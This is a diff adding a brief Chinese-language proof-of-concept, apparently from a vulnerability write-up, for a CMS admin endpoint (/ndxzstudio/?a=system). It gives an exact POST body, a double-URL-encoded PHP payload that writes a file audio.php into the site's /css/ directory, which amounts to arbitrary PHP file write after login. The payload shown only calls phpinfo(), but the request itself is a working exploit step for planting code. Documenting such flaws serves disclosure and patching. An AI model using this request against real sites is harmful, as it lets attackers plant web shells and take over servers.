@@ -1,0 +1,9 @@
+### POC实现代码如下：  
+
+> 当我们登录进后台后，向/ndxzstudio/?a=system  
+> post数据：
+
+``` raw
+upd_jxcode=true&v=%253C%253Fphp%2520phpinfo()%253B%253F%253E&id=%2Fcss%2Faudio.php
+```
+> 即可在/css/目录写入一个php文件audio.php。  
